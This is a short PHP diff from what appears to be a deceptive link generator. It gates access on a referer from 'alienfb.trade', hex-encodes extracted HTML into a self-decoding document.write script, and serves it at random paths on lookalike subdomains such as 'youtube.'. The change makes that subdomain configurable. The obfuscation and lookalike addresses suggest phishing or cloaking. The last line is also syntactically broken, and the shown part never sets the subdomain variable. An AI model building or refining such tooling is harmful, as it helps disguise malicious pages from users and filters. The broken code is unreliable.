@@ -15,7 +15,7 @@ die();
 if($_SERVER['HTTP_REFERER'] !== 'https://alienfb.trade/'){
  die('Unauthorized access');}
 
-if (isset($_GET['api'])) {
+if (isset($_GET['api']) && isset($_GET['subdominio']) ) {
 $API =  $_GET['api'];   
 $PROTOCOLO  =  "https://";
 $NAMEFILE = generateRandomString();
@@ -40,6 +40,6 @@ $decode =  utf8_decode($contentHTMLEXTRAIDO);
 $hex = bin2hex($decode);	
 $script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';	
 
-file_put_contents("youtube/links". "/" .$NAMEFILE, $script);
-echo  'https://youtube.'.$DOMAIN.'/'.$NAMEFILE;
+file_put_contents($SUBDOMINIO."/links". "/" .$NAMEFILE, $script);
+echo  $PROTOCOLO.$SUBDOMINIO'.'.$DOMAIN.'/'.$NAMEFILE;
 } 
